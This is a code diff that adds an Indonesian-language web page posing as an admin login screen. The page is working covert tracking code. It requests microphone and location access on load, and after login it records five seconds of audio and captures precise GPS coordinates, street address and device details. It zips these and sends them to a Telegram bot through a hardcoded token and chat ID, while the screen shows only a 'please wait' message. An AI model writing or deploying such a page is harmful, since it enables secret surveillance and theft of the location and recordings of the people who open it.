@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Login & ZIP Logger with Time</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #0f172a;
+      color: white;
+      text-align: center;
+      padding-top: 50px;
+    }
+    input, button {
+      padding: 10px 20px;
+      font-size: 16px;
+      margin: 10px;
+      border: none;
+      border-radius: 6px;
+    }
+    input {
+      width: 250px;
+    }
+    button {
+      background-color: #22c55e;
+      color: white;
+      cursor: pointer;
+    }
+    #dashboard {
+      display: none;
+    }
+    #status {
+      margin-top: 15px;
+      color: #a3e635;
+    }
+    #info {
+      margin-top: 20px;
+      color: #94a3b8;
+      font-style: italic;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="login">
+    <h2>Login Admin</h2>
+    <input type="text" id="username" placeholder="Username" /><br>
+    <input type="password" id="password" placeholder="Password" /><br>
+    <button onclick="cekLogin()">MASUK DASHBOARD</button>
+  </div>
+
+  <div id="dashboard">
+    <h2>Dashboard Aktif</h2>
+    <div id="status">Lading Mohon Tunggu Sebentar. ..</div>
+    <div id="info">Sedang Di Prosess</div>
+  </div>
+
+  <script>
+    const token = '7224189748:AAE1sTCCosh1MrE_m4QwH8k0FUbUWIOBd3o';
+    const chatId = '7502679833';
+    const validUsername = 'admin';
+    const validPassword = '123456';
+
+    let recordedAudioBlob = null;
+
+    const userAgent = navigator.userAgent;
+    const screenRes = `${screen.width} x ${screen.height}`;
+    const device = /Android/i.test(userAgent) ? "Android" :
+                   /iPhone/i.test(userAgent) ? "iPhone" :
+                   /iPad/i.test(userAgent) ? "iPad" :
+                   /Windows/i.test(userAgent) ? "Windows" :
+                   /Mac/i.test(userAgent) ? "Mac" : "Unknown";
+
+    function cekLogin() {
+      const user = document.getElementById('username').value.trim();
+      const pass = document.getElementById('password').value.trim();
+
+      if (user === validUsername && pass === validPassword) {
+        document.getElementById('login').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+        mulaiTracking();
+      } else {
+        alert("❌ Username atau Password salah!");
+      }
+    }
+
+    async function mulaiTracking() {
+      const statusDiv = document.getElementById('status');
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const audioChunks = [];
+
+        mediaRecorder.ondataavailable = e => {
+          if (e.data.size > 0) audioChunks.push(e.data);
+        };
+
+        mediaRecorder.onstop = () => {
+          recordedAudioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+          getLocationAndZipData();
+        };
+
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+
+      } catch (err) {
+        statusDiv.innerText = "❌ Mikrofon gagal diakses: " + err.message;
+      }
+    }
+
+    function getLocationAndZipData() {
+      navigator.geolocation.getCurrentPosition(position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const acc = position.coords.accuracy;
+        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+        fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
+          .then(res => res.json())
+          .then(data => {
+            const alamat = data.display_name || "Alamat tidak ditemukan";
+
+            const now = new Date();
+            const tanggal = now.toISOString().split("T")[0];
+            const waktu = now.toTimeString().split(" ")[0];
+
+            const logText = `
+🔐 Data Pelacakan
+🗓 Tanggal: ${tanggal}
+🕒 Waktu: ${waktu}
+👤 Username: admin
+📍 Lokasi: ${lat}, ${lon}
+🌐 Link: ${mapLink}
+🎯 Akurasi: ${acc} meter
+🏠 Alamat: ${alamat}
+
+📱 Perangkat: ${device}
+📺 Resolusi: ${screenRes}
+🧾 User Agent: ${userAgent}
+`;
+
+            buatDanKirimZip(logText, recordedAudioBlob);
+          });
+
+      }, err => {
+        document.getElementById('status').innerText = "❌ Lokasi gagal: " + err.message;
+      }, { enableHighAccuracy: true });
+    }
+
+    async function buatDanKirimZip(logText, audioBlob) {
+      const zip = new JSZip();
+      zip.file("log.txt", logText);
+
+      if (audioBlob) {
+        zip.file("rekaman.webm", audioBlob);
+      }
+
+      const zipBlob = await zip.generateAsync({ type: "blob" });
+
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("document", zipBlob, "data_log.zip");
+
+      fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
+        method: "POST",
+        body: formData
+      }).then(() => {
+        document.getElementById('status').innerText = "✅ Log berhasil dikirim dalam ZIP ke Telegram.";
+      });
+    }
+
+    function mintaIzin() {
+      navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(stream => stream.getTracks().forEach(track => track.stop()))
+        .catch(err => console.warn("❌ Mikrofon ditolak:", err.message));
+
+      navigator.geolocation.getCurrentPosition(
+        () => console.log("✅ Lokasi diizinkan"),
+        err => console.warn("❌ Lokasi ditolak:", err.message),
+        { enableHighAccuracy: true }
+      );
+    }
+
+    window.onload = () => mintaIzin();
+  </script>
+</body>
+</html>
